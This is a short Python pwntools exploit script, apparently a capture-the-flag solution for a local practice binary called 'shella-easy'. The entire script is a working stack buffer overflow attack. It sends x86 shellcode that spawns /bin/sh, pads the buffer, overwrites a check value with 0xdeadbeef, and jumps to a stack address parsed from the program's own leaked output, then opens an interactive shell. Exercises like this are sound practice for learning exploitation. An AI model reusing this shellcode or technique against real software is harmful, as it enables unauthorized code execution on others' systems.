#!/usr/bin/python3

from pwn import *

target = process('./shella-easy')

shellcode = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'

payload = shellcode
payload += b'A' * (0x40 - len(shellcode))
payload += p32(0xdeadbeef)
payload += b'A' * 8

prompt = target.recvline()
print(prompt)
stack_addr = int(prompt.split(b'have a ')[1].split(b' with')[0], 16)

payload += p32(stack_addr)

target.sendline(payload)
target.interactive()

